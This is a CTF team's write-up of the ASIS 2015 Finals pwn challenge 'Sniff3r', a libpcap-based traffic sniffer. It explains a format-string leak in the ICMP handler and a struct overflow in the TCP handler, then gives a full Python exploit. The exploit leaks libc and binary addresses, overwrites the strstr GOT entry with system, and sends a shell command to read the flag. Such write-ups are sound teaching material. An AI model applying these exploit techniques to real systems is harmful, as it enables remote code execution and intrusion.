---
layout: post
title: "ASIS 2015 Finals: Sniff3r"
modified: 2015-10-15
tags: asis asis2015finals pwn libpcap
---

*This challenge was solved by and the write up was written by one of my teammates, [tukan](https://twitter.com/kapteinemalje)*

We were given an x64 ELF binary and the corresponding libc. It had most protections enabled but still had writeable .got entries. 

Reversing the challenge revealed that:

- the binary sniffs trafic via libpcap.
- processes only icmp and tcp/80 traffic.
- the icmp handler contains an information leak via a format string bug.
- the tcp handler contains a buffer overflow inside the structure allocated for tcp connections, allowing us to modify pointers later used as destination addresses for memcpy calls with attacker-controlled source data.
    
The relevant parts of the struct:

{% highlight c %}
struct connection {
	char hostname[256];
	char *username;
	char *password;
	...
}
{% endhighlight %}

The exploitation plan is as follows:

- leak pointers to libc and the binary from the stack using the format string bug.
- overwrite the username pointer in the connection struct with the address of the strstr .got entry.
- overwrite the strstr got entry (called on attacker-controlled data in the tcp handler) via the address of system from libc.
- read the flag using the the shell command: ". ./flag" (made possible by stderr coming back from the binary)

![alt]({{ site.url }}/images/asis2015finals/sniffer.png)

The flag was:
{% highlight text %}
ASIS{9327c8a200259781799e2a1a4966a371}
{% endhighlight %}

### Exploit

(not stable, you probably have to run multiple times)
    
{% highlight python %}
#! /usr/bin/env python
from pwn import *
from scapy.all import *

# LIVE = False
LIVE = True
def round():
    if LIVE:
        HOST = '185.82.202.66'
        r = remote(HOST, 2222)      # knocking
    else:
        HOST = '192.168.0.22'

    print 'HOST: ', HOST

    context.update(arch='amd64', os='linux')

    def leakit():
        payload = '%x'*10 + 'ZZZ' + '%p' + 'YYY' + '%x'* 6 + 'KKK%pLLL' + '%x'*112  + 'AAA' + '%p' + 'BBB' +'a'*440
        print 'payloadlen: ', len(payload)
        p = sr1(IP(dst=HOST)/ICMP()/payload, timeout=2)
        if not p:
            return None, None, None
        resp = str(p[Raw])
        print 'Resp: ', resp, len(resp)
        cookie = resp.split('ZZZ')[1].split('YYY')[0]
        cookie = int(cookie, 16)
        bin_addr = resp.split('KKK')[1].split('LLL')[0]
        bin_addr = int(bin_addr, 16)
        libc_addr = resp.split('AAA')[1].split('BBB')[0]
        libc_addr = int(libc_addr, 16)

        return bin_addr, libc_addr, cookie


    bin_addr, libc_addr, cookie = leakit()
    if not bin_addr:
        return
    print 'bin: ', hex(bin_addr)
    print 'libc: ', hex(libc_addr)
    print 'Cookie: ', hex(cookie)

    libc_diff = 0x7ffff7833ec5 - 0x00007ffff7812000
    libc_base = libc_addr - libc_diff
    system_offset = 0x0000000000046640
    system = libc_base + system_offset
    bin_diff = 0x182C
    bin_base = bin_addr - bin_diff
    strstr_offset = 0x203128
    strstr = bin_base + strstr_offset


    payload = 'Host: ' + cyclic(256) + p64(strstr) + '\r\nusername=' + p64(system) + '&password=' + 'A'*6 + '\r\n'
    q = send(IP(dst=HOST)/TCP(dport=80)/payload)
    # q = send(IP(dst=HOST)/TCP(dport=80)/'echo kaosdkas > /tmp/lolci #')
    q = send(IP(dst=HOST)/TCP(dport=80)/'. ./flag')
    r.interactive()

round()
{% endhighlight %}